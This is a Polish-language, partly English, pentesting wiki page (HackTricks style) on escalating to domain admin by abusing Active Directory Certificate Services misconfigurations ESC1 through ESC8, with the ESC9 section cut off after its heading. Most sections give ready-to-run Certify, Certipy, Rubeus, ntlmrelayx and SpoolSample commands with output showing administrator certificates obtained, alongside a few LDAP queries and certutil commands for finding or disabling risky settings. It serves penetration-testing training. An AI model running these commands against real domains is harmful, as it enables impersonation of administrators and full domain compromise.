# Eskalacja domeny AD CS

{{#include ../../../banners/hacktricks-training.md}}


**To podsumowanie sekcji dotyczących technik eskalacji z artykułów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Wyjaśnienie ESC1: błędnie skonfigurowane szablony certyfikatów

- **Enterprise CA przyznaje uprawnienia do rejestracji certyfikatów użytkownikom o niskich uprawnieniach.**
- **Zatwierdzenie przez przełożonego nie jest wymagane.**
- **Nie są wymagane podpisy upoważnionych osób.**
- **Deskryptory zabezpieczeń szablonów certyfikatów są nadmiernie liberalne, umożliwiając użytkownikom o niskich uprawnieniach uzyskanie uprawnień do rejestracji certyfikatów.**
- **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
- Uwzględniane są identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA).
- **Szablon zezwala wnioskodawcom na dołączanie subjectAltName do Certificate Signing Request (CSR):**
- Active Directory (AD) nadaje priorytet subjectAltName (SAN) w certyfikacie podczas weryfikacji tożsamości, jeśli jest on obecny. Oznacza to, że poprzez określenie SAN w CSR można zażądać certyfikatu umożliwiającego podszywanie się pod dowolnego użytkownika (np. administratora domeny). To, czy wnioskodawca może określić SAN, wskazuje właściwość `mspki-certificate-name-flag` obiektu AD szablonu certyfikatu. Ta właściwość jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zezwala wnioskodawcy na określenie SAN.

> [!CAUTION]
> Opisana konfiguracja pozwala użytkownikom o niskich uprawnieniach żądać certyfikatów z dowolnie wybranym SAN, umożliwiając uwierzytelnianie jako dowolna jednostka domeny za pośrednictwem Kerberos lub SChannel.

Ta funkcja jest czasami włączana w celu obsługi generowania w locie certyfikatów HTTPS lub certyfikatów hostów przez produkty albo usługi wdrożeniowe, a także z powodu braku zrozumienia jej działania.

Należy zauważyć, że utworzenie certyfikatu z tą opcją powoduje wyświetlenie ostrzeżenia, co nie ma miejsca, gdy istniejący szablon certyfikatu (taki jak szablon `WebServer`, w którym włączono `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) zostanie zduplikowany, a następnie zmodyfikowany w celu uwzględnienia OID uwierzytelniania.<sup>[[6]](#references)</sup>

### Wykorzystanie

Aby **znaleźć podatne szablony certyfikatów**, możesz uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę podatność do podszycia się pod administratora**, można uruchomić:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i użyć go ponownie do **uwierzytelniania za pomocą Rubeus lub certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Pliki binarne systemu Windows „Certreq.exe” i „Certutil.exe” mogą zostać użyte do wygenerowania pliku PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumerację szablonów certyfikatów w schemacie konfiguracji lasu AD, a w szczególności tych, które nie wymagają zatwierdzenia ani podpisów, posiadają EKU Client Authentication lub Smart Card Logon oraz mają włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić, wykonując następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Nieprawidłowo skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz abuse jest wariantem pierwszego:

1. Enterprise CA przyznaje low-privileged users prawa do enrollment.
2. Wymóg zatwierdzenia przez managera jest wyłączony.
3. Pominięto wymóg autoryzowanych podpisów.
4. Nadmiernie permissive security descriptor na certificate template przyznaje low-privileged users prawa do certificate enrollment.
5. **Certificate template jest zdefiniowany tak, aby zawierał Any Purpose EKU lub nie zawierał EKU.**

**Any Purpose EKU** pozwala attackerowi uzyskać certificate do **dowolnego celu**, w tym do client authentication, server authentication, code signing itd. Do exploitowania tego scenariusza można wykorzystać tę samą **technikę używaną w ESC3**.

Certificates **bez EKU**, które działają jako subordinate CA certificates, mogą być wykorzystywane do **dowolnego celu** i mogą **również służyć do podpisywania nowych certificates**. Attacker może więc określać dowolne EKU lub pola w nowych certificates, wykorzystując subordinate CA certificate.

Nowe certificates utworzone na potrzeby **domain authentication** nie będą działać, jeśli subordinate CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Attacker może jednak nadal tworzyć **nowe certificates z dowolnym EKU** i dowolnymi wartościami certificate. Mogą one potencjalnie zostać **wykorzystane** do szerokiego zakresu celów (np. code signing, server authentication itd.) i mieć istotne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.<sup>[[6]](#references)</sup>

Aby wyliczyć templates pasujące do tego scenariusza w schema konfiguracyjnym AD Forest, można wykonać następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Nieprawidłowo skonfigurowane szablony Enrollment Agent - ESC3

### Wyjaśnienie

Ten scenariusz przypomina pierwszy i drugi, ale **wykorzystuje** **inny EKU** (Certificate Request Agent) oraz **2 różne szablony** (dlatego ma 2 zestawy wymagań),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), znany w dokumentacji Microsoft jako **Enrollment Agent**, umożliwia principalowi **uzyskanie** **certyfikatu** **w imieniu innego użytkownika**.

**„Enrollment agent”** uzyskuje taki **certyfikat** z **szablonu** i używa wynikowego **certyfikatu do współpodpisania CSR w imieniu innego użytkownika**. Następnie **wysyła** **współpodpisany CSR** do CA, uzyskując certyfikat z **szablonu**, który **zezwala na „enroll on behalf of”**, a CA odpowiada **certyfikatem należącym do „innego” użytkownika**.<sup>[[6]](#references)</sup>

**Wymagania 1:**

- Enterprise CA przyznaje uprawnienia do uzyskiwania certyfikatów użytkownikom o niskich uprawnieniach.
- Wymóg zatwierdzenia przez managera jest pominięty.
- Nie ma wymogu autoryzowanych podpisów.
- Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie permissywny i przyznaje uprawnienia do uzyskiwania certyfikatów użytkownikom o niskich uprawnieniach.
- Szablon certyfikatu zawiera Certificate Request Agent EKU, umożliwiając żądanie innych szablonów certyfikatów w imieniu innych principalów.

**Wymagania 2:**

- Enterprise CA przyznaje uprawnienia do uzyskiwania certyfikatów użytkownikom o niskich uprawnieniach.
- Zatwierdzenie przez managera jest omijane.
- Wersja schematu szablonu wynosi 1 lub przekracza 2, a szablon określa Application Policy Issuance Requirement wymagający Certificate Request Agent EKU.
- EKU zdefiniowany w szablonie certyfikatu zezwala na uwierzytelnianie w domenie.
- Ograniczenia dla Enrollment Agents nie są stosowane na CA.

### Abuse

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby wykorzystać ten scenariusz:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users**, którzy mogą **uzyskać** **certyfikat agenta rejestracji**, szablony, w których agenci rejestracji mogą przeprowadzać rejestrację, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczane przez urzędy certyfikacji przedsiębiorstwa. Osiąga się to poprzez otwarcie **snap-inu** `certsrc.msc`, **kliknięcie prawym przyciskiem myszy urzędu certyfikacji**, wybranie **Properties**, a następnie przejście do karty „Enrollment Agents”.

Należy jednak zauważyć, że **domyślnym** ustawieniem urzędów certyfikacji jest „**Do not restrict enrollment agents**”. Gdy administratorzy włączą ograniczenie dotyczące agentów rejestracji, ustawiając opcję „Restrict enrollment agents”, domyślna konfiguracja nadal pozostaje niezwykle liberalna. Umożliwia ona **Everyone** rejestrację we wszystkich szablonach jako dowolna osoba.

## Kontrola dostępu do podatnego szablonu certyfikatu - ESC4

### **Wyjaśnienie**

**Deskryptor zabezpieczeń** na **szablonach certyfikatów** definiuje **uprawnienia**, które określone **podmioty AD** posiadają względem szablonu.

Jeśli **attacker** posiada wymagane **uprawnienia** do **modyfikowania** **szablonu** i **wprowadzenia** dowolnych **wykorzystywalnych błędnych konfiguracji** opisanych w **poprzednich sekcjach**, możliwe jest przeprowadzenie privilege escalation.

Najważniejsze uprawnienia dotyczące szablonów certyfikatów obejmują:<sup>[[6]](#references)</sup>

- **Owner:** Przyznaje niejawne uprawnienia do kontroli obiektu, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Zapewnia pełną kontrolę nad obiektem, w tym możliwość modyfikowania dowolnych atrybutów.
- **WriteOwner:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez attackera.
- **WriteDacl:** Umożliwia modyfikowanie kontroli dostępu, potencjalnie przyznając attackerowi uprawnienie FullControl.
- **WriteProperty:** Umożliwia edytowanie dowolnych właściwości obiektu.

### Abuse

Aby zidentyfikować podmioty posiadające prawa edycji szablonów i innych obiektów PKI, wykonaj enumerację za pomocą Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Przykład `privesc`, podobny do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje, gdy użytkownik ma uprawnienia zapisu do szablonu certyfikatu. Można to na przykład wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby uczynić go podatnym na ESC1.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowe powiązanie `AddKeyCredentialLink` z `JOHNPC`. Ponieważ ta technika jest związana z certyfikatami, zaimplementowałem również ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Oto krótka zapowiedź polecenia `shadow auto` w Certipy, służącego do pobrania hasha NT ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu za pomocą pojedynczego polecenia. **Domyślnie** Certipy **nadpisze** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy również określić **parametr `-save-old`, aby zapisać starą konfigurację**, co będzie przydatne do **przywrócenia** konfiguracji po naszym ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola dostępu do podatnych obiektów PKI - ESC5

### Wyjaśnienie

Rozbudowana sieć wzajemnie powiązanych relacji opartych na ACL, obejmująca kilka obiektów wykraczających poza szablony certyfikatów i urząd certyfikacji, może wpływać na bezpieczeństwo całego systemu AD CS. Obiekty te, które mogą znacząco wpływać na bezpieczeństwo, obejmują:

- Obiekt komputera AD serwera CA, który może zostać przejęty za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
- Serwer RPC/DCOM serwera CA.
- Dowolny potomny obiekt AD lub kontener znajdujący się w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ścieżka ta obejmuje między innymi kontenery i obiekty takie jak kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates oraz Enrollment Services Container.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach zdoła przejąć kontrolę nad dowolnym z tych krytycznych komponentów.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Temat omówiony we [**wpisie CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) porusza również konsekwencje flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, opisane przez Microsoft. Po aktywowaniu tej konfiguracji na Certification Authority (CA) umożliwia ona dołączanie **wartości zdefiniowanych przez użytkownika** do **subject alternative name** dla **dowolnego żądania**, w tym żądań tworzonych na podstawie Active Directory®. W rezultacie atakujący może uzyskać certyfikat za pomocą **dowolnego szablonu** skonfigurowanego do **uwierzytelniania** w domenie — w szczególności takiego, który zezwala na rejestrację **nieuprzywilejowanym** użytkownikom, jak standardowy szablon User. Dzięki temu można uzyskać certyfikat umożliwiający uwierzytelnianie jako administrator domeny lub **dowolna inna aktywna jednostka** w domenie.<sup>[[9]](#references)</sup>

**Uwaga**: Sposób dołączania **nazw alternatywnych** do Certificate Signing Request (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (określanego jako „Name Value Pairs”) różni się od strategii exploitation SAN w ESC1. Różnica polega tutaj na **sposobie osadzania informacji o koncie** — znajdują się one w atrybucie certyfikatu, a nie w rozszerzeniu.

### Nadużycie

Aby sprawdzić, czy to ustawienie jest aktywne, organizacje mogą użyć następującego polecenia za pomocą `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja zasadniczo wykorzystuje **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykrywać tę błędną konfigurację i ją wykorzystywać:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając, że posiada się uprawnienia **administratora domeny** lub równoważne, następujące polecenie można wykonać z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Po wydaniu aktualizacji zabezpieczeń z maja 2022 r. nowo wystawione **certificates** będą zawierać **security extension**, która uwzględnia właściwość **`objectSid` requestera**. W przypadku ESC1 ten SID jest wyprowadzany z określonego SAN. Jednak w przypadku **ESC6** SID odzwierciedla **`objectSid` requestera**, a nie SAN.\
> Aby wykorzystać ESC6, system musi być podatny na ESC10 (Weak Certificate Mappings), które traktuje **SAN priorytetowo względem nowego security extension**.

## Podatna kontrola dostępu do Certificate Authority - ESC7

### Attack 1

#### Explanation

Kontrola dostępu do certificate authority jest utrzymywana za pomocą zestawu uprawnień, które określają działania CA. Uprawnienia te można wyświetlić, otwierając `certsrv.msc`, klikając prawym przyciskiem myszy CA, wybierając właściwości, a następnie przechodząc do karty Security. Ponadto uprawnienia można enumerować za pomocą modułu PSPKI, używając poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Zapewnia to wgląd w podstawowe uprawnienia, a mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „CA administrator” i „Certificate Manager”.<sup>[[6]](#references)</sup>

#### Nadużycie

Posiadanie uprawnień **`ManageCA`** w urzędzie certyfikacji umożliwia principalowi zdalne modyfikowanie ustawień za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, aby zezwolić na określanie SAN w dowolnym template, co stanowi kluczowy element domain escalation.

Uproszczenie tego procesu jest możliwe dzięki użyciu cmdletu **Enable-PolicyModuleFlag** z PSPKI, który pozwala na wprowadzanie modyfikacji bez bezpośredniej interakcji z GUI.

Posiadanie uprawnień **`ManageCertificates`** umożliwia zatwierdzanie oczekujących żądań, skutecznie omijając zabezpieczenie „CA certificate manager approval”.

Kombinacja modułów **Certify** i **PSPKI** może zostać wykorzystana do zażądania, zatwierdzenia i pobrania certyfikatu:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** uprawnienia **`Manage CA`** zostały użyte do **włączenia** flagi **EDITF_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia **ataku ESC6**, ale nie przyniesie to żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie ponownie uruchomiona. Gdy użytkownik ma prawo dostępu **`Manage CA`**, może również **ponownie uruchomić usługę**. Nie oznacza to jednak, że użytkownik może zdalnie ponownie uruchomić usługę. Ponadto atak E**SC6 może nie działać od razu** w większości zaktualizowanych środowisk z powodu aktualizacji zabezpieczeń z maja 2022 roku.

Dlatego przedstawiono tutaj inny atak.

Wymagania:

- Tylko uprawnienie **`ManageCA`**
- Uprawnienie **`Manage Certificates`** (można je przyznać z poziomu **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (można go włączyć z poziomu **`ManageCA`**)

Technika wykorzystuje fakt, że użytkownicy mający prawa dostępu **`Manage CA`** i **`Manage Certificates`** mogą **wystawiać nieudane żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale tylko **administratorzy** mogą dokonywać w nim rejestracji. W związku z tym **użytkownik** może **zażądać** rejestracji w szablonie **`SubCA`** — co zostanie **odrzucone** — a następnie żądanie zostanie wystawione przez administratora.<sup>[[6]](#references)</sup>

#### Nadużycie

Możesz **przyznać sobie** prawo dostępu **`Manage Certificates`**, dodając swojego użytkownika jako nowego oficera.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagania wstępne tego ataku, możemy rozpocząć od **zażądania certyfikatu na podstawie szablonu `SubCA`**.

**Ten wniosek zostanie odrzuco**ny, ale zachowamy klucz prywatny i zanotujemy identyfikator żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mając uprawnienia **`Manage CA` i `Manage Certificates`**, możemy następnie **wystawić odrzucone żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na koniec możemy **pobrać wystawiony certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse of the Manage Certificates Extension (SetExtension)

#### Explanation

In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.<sup>[[3]](#references)</sup>

The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*. While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.

Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued. The resulting certificate therefore contains an attacker-chosen extension that may:

* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
* Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.

In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.

#### Abusing the primitive with Certify 2.0

1. **Submit a certificate request that will remain *pending*.** This can be forced with a template that requires manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it. Once issued, download the certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTE: The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.<sup>[[6]](#references)</sup>

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:


{{#ref}}
account-persistence.md
{{#endref}}

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez korporacyjne urzędy certyfikacji (CA) do przechowywania punktów końcowych Certificate Enrollment Service (CES). Te punkty końcowe można przeanalizować i wyświetlić za pomocą narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Nadużycia z użyciem Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Nadużycie za pomocą [Certipy](https://github.com/ly4k/Certipy)

Żądanie certyfikatu jest domyślnie wykonywane przez Certipy na podstawie template `Machine` lub `User`, zależnie od tego, czy nazwa konta podlegającego relay kończy się znakiem `$`. Wskazanie alternatywnego template można zrealizować za pomocą parametru `-template`.

Następnie można użyć techniki takiej jak [PetitPotam](https://github.com/ly4k/PetitPotam) w celu wymuszenia uwierzytelniania. W przypadku domain controllers wymagane jest wskazanie `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Brak rozszerzenia zabezpieczeń - ESC9 <a href="#id-5485" id="id-5485"></a>

### Wyjaśnienie

